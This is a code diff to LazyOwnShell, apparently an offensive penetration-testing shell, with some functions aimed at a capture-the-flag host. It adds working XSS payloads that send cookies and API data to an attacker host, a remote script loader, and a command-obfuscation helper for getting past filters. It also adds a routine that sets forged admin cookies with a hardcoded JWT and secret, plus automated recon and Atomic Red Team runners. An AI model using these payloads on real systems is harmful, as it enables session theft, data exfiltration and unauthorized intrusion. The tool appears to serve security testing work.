@@ -3160,8 +3160,12 @@ class LazyOwnShell(cmd2.Cmd):
             )
             return
         rhost = self.params["rhost"]
+        domain = self.params["domain"]
         print_msg(f"Try... openssl s_client -connect  {rhost}:{line} {RESET}")
         os.system(f"openssl s_client -connect  {rhost}:{line}")
+        command = f"true | openssl s_client -connect {domain}:443 2>/dev/null | openssl x509 -noout -text  | perl -l -0777 -ne '@names=/\\bDNS:([^\s,]+)/g; print join(\"\n\", sort @names);' | tee sessions/domains_{domain}.txt"
+        print_msg(command)
+        os.system(command)
         return
 
     def do_ss(self, line):
@@ -5176,11 +5180,23 @@ class LazyOwnShell(cmd2.Cmd):
         lhost = self.params.get("lhost")
         lport = self.params.get("lport")
         rhost = self.params.get("rhost")
+        path = os.getcwd()
+        filename = f"{path}/sessions/script.js"
         if not lhost or not lport or not rhost:
             print_error(f"rhost, lhost and lport must be assign.{RESET}")
             return
 
         print_msg(f"Crafting img payload...")
+
+        js = """
+        fetch('/api/info').then(response => response.text()).then(text => {
+            fetch('http://{lhost}/log?' + btoa(text), {
+                mode: 'no-cors'
+            });
+        });        
+        """.replace("        ",'').replace("{lhost}",lhost)
+        with open(filename, "w") as f:
+            f.write(js)
 
         # Payload 1
         command1 = f'echo "<script>new Image().src="http://{lhost}:80/cookie?c="+document.cookie;</script>" | xclip -sel clip'
@@ -5192,14 +5208,20 @@ class LazyOwnShell(cmd2.Cmd):
         base64_string = base64_encoded.decode("utf-8").strip()
         command2 = f"echo \"<img src=x onerror=eval(atob('{base64_string}'))>\" | xclip -sel clip"
 
+        # Payload 3
+        secondary_payload = (
+            f"<img src=\"1\" onerror=\"this.remove(); var s=document.createElement('script'); s.src='http://{lhost}/scripts.js'; document.body.appendChild(s);\">"
+        )
+
         # Inform user and ask for selection
         print_warn("<modo_de_uso>")
         print_msg(f"Payload 1: {command1}")
         print_msg(f"Payload 2: {command2}")
+        print_msg(f"Payload 3: {secondary_payload}")
         print_warn("</modo_de_uso>")
 
         choice = input(
-            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}"
+            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1, 2 or 3): {RESET}"
         ).strip()
 
         if choice == "1":
@@ -5208,8 +5230,11 @@ class LazyOwnShell(cmd2.Cmd):
         elif choice == "2":
             os.system(command2)
             print_msg(f"Payload 2 copied to Clipboard")
+        elif choice == "3":
+            copy2clip(secondary_payload)
+            print_msg(f"Payload 3 copied to Clipboard") 
         else:
-            print_error("Invalid choice. Please select 1 or 2.")
+            print_error("Invalid choice. Please select 1, 2 or 3.")
 
         return
 
@@ -16765,6 +16790,15 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/ip/{ip_address}")
         for p in ports.split(","):
             print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/port.php?port={p}")
+            telnet = f"telnet {ip_address} {p}"
+            nc = f"nc -n  {ip_address} {p}"
+            openssl = f"openssl s_client -connect  {ip_address}:{p}"
+            print_msg(telnet)
+            os.system(telnet)
+            print_msg(nc)
+            os.system(nc)
+            print_msg(openssl)
+            os.system(openssl)
             banner = get_banner(ip_address, p)
             if banner and banner not in ("No banner received (timed out)", "Connection reset by peer - no banner available"):
                 print_msg(banner)
@@ -19099,7 +19133,289 @@ class LazyOwnShell(cmd2.Cmd):
             as_country = self.ip2asn.as_country.get(asn, "Unknown")
             print_msg(f"IP {ip} is part of ASN {asn} ({as_name}, {as_country})")
 
+    def do_atomic_tests(self, line):
+        """
+        Executes Atomic Red Team tests based on user-selected platform and test.
 
+        This function performs the following actions:
+        1. Verifies the presence of the Atomic Red Team repository; if not present, it clones it locally.
+        2. Prompts the user to select a target platform, filtering the available tests to only those compatible.
+        3. Displays the filtered tests, including their description and platform compatibility.
+        4. Allows the user to select and execute a test or specify parameters directly.
+
+        Parameters:
+        line (str): Command-line arguments for specifying a test ID or additional parameters. 
+                    If not provided, interactive input will be used.
+
+        Returns:
+        None
+        """
+        atomic_repo = "https://github.com/redcanaryco/atomic-red-team.git"
+        atomic_path = os.path.join("external", ".exploit", "atomic-red-team")
+        atomic_yaml_path = os.path.join(atomic_path, "atomics")
+
+        if not os.path.exists(atomic_path):
+            print_warn("Atomic Red Team repository not found. Cloning...")
+            os.system(f"git clone {atomic_repo} {atomic_path}")
+            print_msg("Repository cloned successfully.")
+
+        print_msg("Select the platform to target:")
+        platforms = ["windows", "macos", "linux", "azure-ad", "containers", "freebsd", "iaas:azure", "iaas:aws", "office-365", "google-workspace", "iaas:gcp"]
+        for idx, platform in enumerate(platforms, 1):
+            print_msg(f"    {idx}. {platform}")
+        
+        try:
+            platform_choice = int(input("    [!] Enter the number of the platform to target: ").strip())
+            selected_platform = platforms[platform_choice - 1]
+        except (ValueError, IndexError):
+            print_warn("Invalid platform selection.")
+            return
+
+        yaml_files = glob.glob(os.path.join(atomic_yaml_path, "**", "*.yaml"), recursive=True)
+        tests = {}
+        for file in yaml_files:
+            with open(file, "r") as f:
+                data = yaml.safe_load(f)
+                if "atomic_tests" in data:
+                    for test in data["atomic_tests"]:
+                        if selected_platform in test.get("supported_platforms", []):
+                            tests[test["auto_generated_guid"]] = {
+                                "name": test["name"],
+                                "description": test.get("description", "No description available"),
+                                "platforms": test.get("supported_platforms", []),
+                                "command": test.get("executor", {}).get("command", "No command available")
+                            }
+
+        if not tests:
+            print_warn(f"No tests available for the selected platform: {selected_platform}")
+            return
+
+        if line:
+            test_id = line.strip()
+            selected_test = tests.get(test_id)
+            if not selected_test:
+                print_warn(f"Test ID {test_id} not found.")
+                return
+        else:
+            print_msg(f"Available Atomic Red Team tests for {selected_platform}:")
+            for idx, (test_id, test) in enumerate(tests.items(), 1):
+                print_msg(f"    [+] {idx}. {test['name']} (Platforms: {', '.join(test['platforms'])}) [👽]")
+            try:
+                test_choice = int(input("    [!] Enter the number of the test to execute: ").strip())
+                test_id = list(tests.keys())[test_choice - 1]
+                selected_test = tests[test_id]
+            except (ValueError, IndexError):
+                print_warn("Invalid choice.")
+                return
+
+        print_msg(f"Executing test: {selected_test['name']}")
+        print_msg(f"Description: {selected_test['description']}")
+        print_msg(f"Platforms: {', '.join(selected_test['platforms'])}")
+        command = selected_test["command"]
+        
+        copy2clip(command)
+
+    def do_mitre_test(self, line):
+        """
+        Interacts with the MITRE ATT&CK framework using the STIX 2.0 format.
+        
+        This function connects to a locally cached or downloaded ATT&CK dataset in STIX 2.0 format.
+        It allows the user to explore tactics, techniques, and procedures (TTPs) and filter them
+        based on specific criteria, such as platform or tactic.
+
+        Parameters:
+            line (str): User input, which may specify filters or actions, such as a tactic name or technique ID.
+
+        Usage:
+            mitre_test list             # Lists all tactics and techniques
+            mitre_test tactic <name>    # Lists techniques for a specific tactic
+            mitre_test technique <id>   # Shows details of a specific technique
+        """
+        try:
+
+            mitre_repo = "https://github.com/mitre-attack/attack-stix-data.git"
+            mitre_path = os.path.join("external", ".exploit", "mitre")
+            enterprise_attack_path = os.path.join(mitre_path,"enterprise-attack", "enterprise-attack-16.1.json")
+            
+            if not os.path.exists(mitre_path):
+                print_warn("MITRE ATT&CK repository not found. Cloning...")
+                os.makedirs(mitre_path, exist_ok=True)
+                os.system(f"git clone {mitre_repo} {mitre_path}")
+                print_msg("Repository cloned successfully.")
+            
+            if not os.path.exists(enterprise_attack_path):
+                print_warn("Error: Enterprise ATT&CK dataset not found in the cloned repository.")
+                print_warn("Please verify the repository structure.")
+                return
+            
+            print_msg("MITRE ATT&CK dataset ready. Performing analysis...")
+
+            with open(enterprise_attack_path, "r") as f:
+                attack_data = json.load(f)
+
+            attack_store = MemoryStore(stix_data=attack_data)
+
+            args = line.split()
+            if not args:
+                print_msg("Usage: mitre_test <list|tactic|technique> [arguments]")
+                return
+
+            command = args[0]
+
+            if command == "list":
+                tactics = attack_store.query([Filter("type", "=", "x-mitre-tactic")])
+                techniques = attack_store.query([Filter("type", "=", "attack-pattern")])
+                print_msg("Tactics:")
+                for tactic in tactics:
+                    print_msg(f"- {tactic['name']}")
+                print_msg("\nTechniques:")
+                for technique in techniques:
+                    print_msg(f"- {technique['name']} (ID: {technique['id']})")
+
+            elif command == "tactic":
+                if len(args) < 2:
+                    print_warn("Usage: mitre_test tactic <name>")
+                    return
+                tactic_name = " ".join(args[1:])
+                tactic = next(
+                    (t for t in attack_store.query([Filter("type", "=", "x-mitre-tactic")]) if t["name"].lower() == tactic_name.lower()),
+                    None
+                )
+                if not tactic:
+                    print_warn(f"Tactic '{tactic_name}' not found.")
+                    return
+
+                techniques = attack_store.query([
+                    Filter("type", "=", "attack-pattern"),
+                    Filter("kill_chain_phases.phase_name", "=", tactic["x_mitre_shortname"])
+                ])
+                print_msg(f"Techniques for tactic '{tactic_name}':")
+                for technique in techniques:
+                    print_msg(f"- {technique['name']} (ID: {technique['id']})")
+
+            elif command == "technique":
+                if len(args) < 2:
+                    print_warn("Usage: mitre_test technique <id>")
+                    return
+                technique_id = args[1]
+                technique = next(
+                    (t for t in attack_store.query([Filter("type", "=", "attack-pattern")]) if technique_id in t["id"]),
+                    None
+                )
+                if not technique:
+                    print_warn(f"Technique '{technique_id}' not found.")
+                    return
+
+                print_msg(f"Technique: {technique['name']}")
+                print_msg(f"Description: {technique.get('description', 'No description available.')}")
+                print_msg(f"Platforms: {', '.join(technique.get('x_mitre_platforms', []))}")
+                print_msg(f"Data Sources: {', '.join(technique.get('x_mitre_data_sources', []))}")
+                print_msg(f"More Info: {technique.get('external_references', [{}])[0].get('url', 'N/A')}")
+
+            else:
+                print_msg("Unknown command. Use 'list', 'tactic', or 'technique'.")
+        except Exception as e:
+            print_error(f"Error: {e}")
+
+    def do_bbot(self, line):
+        """
+        Executes a BBOT scan to perform various reconnaissance tasks.
+        
+        This function leverages BBOT, a reconnaissance tool, to perform tasks such as subdomain enumeration,
+        email gathering, web scanning, and more. It dynamically determines the operation based on user input
+        and executes the appropriate BBOT commands.
+
+        Parameters:
+            line (str): User input specifying the target and optional presets or configurations.
+
+        Usage:
+            bbot -t <target> -p <preset>
+            
+            Examples:
+                bbot -t evilcorp.com -p subdomain-enum
+                bbot -t evilcorp.com -p email-enum spider web-basic
+        """
+        try:
+            bbot_check = os.system("which bbot > /dev/null 2>&1")
+            if bbot_check != 0:
+                print_warn("BBOT is not installed. Installing...")
+                os.system("pipx install bbot")
+                print_msg("BBOT installed successfully.")
+
+            domain = self.params.get("domain", "localhost")  
+
+            choice = input("    [!] Enter the mode (1 Subdomain, 2 Spider, 3 Email, 4 Web, 5 Web thorough, 6 All): ") or '6'
+
+            if choice == "1":
+                command = f"bbot -t {domain} -p subdomain-enum "
+            elif choice == "2":
+                command = f"bbot -t {domain} -p spider "
+            elif choice == "3":
+                command = f"bbot -t {domain} -p email-enum "
+            elif choice == "4":
+                command = f"bbot -t {domain} -p web-basic "    
+            elif choice == "5":
+                command = f"bbot -t {domain} -p web-thorough "        
+            elif choice == "6":
+                command = f"bbot -t {domain} -p subdomain-enum cloud-enum code-enum email-enum spider web-basic paramminer dirbust-light web-screenshots --allow-deadly"  
+            print_msg(f"Ejecutando comando BBOT: {command}")
+            os.system(command)
+            print_msg("Escaneo con BBOT completado.")
+        except Exception as e:
+            print_error(f"Error: {e}")
+
+    def do_amass(self, line):
+        """
+        Executes Amass to perform a passive enumeration on a given domain.
+
+        This function performs the following steps:
+        1. Executes the Amass tool with the provided domain for passive enumeration.
+        2. Saves the results to a file named 'results.txt' in the current directory.
+
+        Parameters:
+        line (str): The domain to be enumerated, e.g., 'example.com'.
+
+        Returns:
+        None
+        """
+        if line:
+            domain = line.strip()
+        else:
+            domain = self.params["domain"]
+        if not domain:
+            print_error("No domain provided. Please provide a valid domain to enumerate.")
+            return
+
+        command = f"amass enum -passive -d {domain} -o sessions/amass_{domain}_results.txt"
+        print_msg(f"Running Amass for domain {domain}...")
+
+        os.system(command)
+        print_msg(f"Amass enumeration completed. Results saved in sessions/amass_{domain}_results.txt.")
+    
+
+    def do_filtering(self, line):
+        """
+        Applies various filtering techniques to the given command line by modifying each character or word appropriately.
+        
+        This function takes any command and generates variations of it using several filtering techniques, including:
+        1. Quote filtering.
+        2. Slash filtering.
+        
+        Parameters:
+        line (str): The input command to be filtered.
+
+        Returns:
+        None
+        """
+
+        quote_filtered = ''.join([f"'{c}'" if i % 2 == 0 else c for i, c in enumerate(line)])
+        quote_filtered_alt = ''.join([f"\"{c}\"" if i % 2 == 0 else c for i, c in enumerate(line)])
+        slash_filtered = ''.join([f"\\{c}\\" if i % 2 == 0 else c for i, c in enumerate(line)])
+        print_msg(f"Original command: {line}")
+        print_msg(f"Quote Filtering: {quote_filtered}")
+        print_msg(f"Quote Filtering: {quote_filtered_alt}")
+        print_msg(f"Slash Filtering: {slash_filtered}")
+        copy2clip(quote_filtered)
 
     def do_lol(self, line):
         """
@@ -19119,49 +19435,47 @@ class LazyOwnShell(cmd2.Cmd):
         """
         rhost = self.params["rhost"]
         url = f'http://{rhost}'
-        lhost = self.params["lhost"]
         payload = (
             "<img src=x onerror=\"fetch('/api/update_role', {method: 'POST', headers: { 'Content-Type': 'application/json'}, "
-            "body: JSON.stringify({ 'username': 'grisun1', 'role': 'Subscribe'})})\" />"
+            "body: JSON.stringify({ 'username': 'grisun0', 'role': 'grisun0'})})\" />"
         )
-
-        secondary_payload = (
-            "<img src=x onerror=\"fetch('/api/info').then(response => response.text()).then(text => {"
-            f"fetch('http://{lhost}/log?' + btoa(text), {{ mode: 'no-cors' }});"
-            "})\" />"
-        )
-
         headers = {
             "Content-Type": "application/json"
         }
-
         s = requests.Session()
         print_msg(f"Logging in and sending payload to {url}")
-        login_response = s.post(f'{url}/api/login', headers=headers, json={"username": "grisun1", "password": "Subscribe"})
-
+        login_response = s.post(f'{url}/api/login', headers=headers, json={"username": "grisun0", "password": "grisun0"})
         if login_response.status_code == 200:
             print_msg("Login successful. Injecting primary payload.")
-            report_response = s.post(
-                f'{url}/api/report_user',
-                headers=headers,
-                json={"username": payload}
+            s.cookies.set("role", "admin", domain="blockblock.htb", path="/")
+            s.cookies.set(
+                "token",
+                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMTk3NjE5MSwianRpIjoiMjIwMjYwMTMtMTM2YS00MTkwLTk2MWQtMjJiYmIzZWZiYmRiIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMxOTc2MTkxLCJleHAiOjE3MzI1ODA5OTF9.gNXBfs7sRc5rYyZWPJK18ySGlcZ_16dt9-UnKeX2fnM",
+                domain="blockblock.htb",
+                path="/",
             )
-            print_msg(f"Primary payload response: {report_response.status_code} - {report_response.text}")
-
-            print_msg("Injecting secondary payload to exfiltrate admin tokens.")
-            secondary_response = s.post(
-                f'{url}/api/report_user',
-                headers=headers,
-                json={"username": secondary_payload}
-            )
-            print_msg(f"Secondary payload response: {secondary_response.status_code} - {secondary_response.text}")
-        else:
-            print_warn("Login failed. Unable to inject payloads.")
-
-
-
-
-
+            s.cookies.set("username", "admin", domain="blockblock.htb", path="/")
+            jwt_secret = {"Authorization": "34fd1a8cb0b169220123f98cb8fa442c5d271826fe1bddfe2185402bf2a5d3b9"}
+            url = f"{url}/api/json-rpc"
+            headers = {
+                "Content-Type": "application/json",
+                "token": jwt_secret["Authorization"],
+            }
+ #           payload = {
+  #              "jsonrpc": "2.0",
+   #             "method": f"{line}",
+    #            "params": ["0x1", True],
+     #           "id": 1
+      #      }0x75e41404c8c1de0c2ec801f06fbf5ace8662240f
+            payload = {
+                "jsonrpc": "2.0",
+                "method": "eth_getLogs",
+                "params": [{"address": "0x75e41404c8c1de0c2ec801f06fbf5ace8662240f"}],  # Dirección del contrato inteligente
+                "id": 1
+            }
+            print_msg(payload)
+            response = s.post(url, headers=headers, json=payload)
+            print_msg(response.json())
 
 if __name__ == "__main__":
     p = LazyOwnShell()
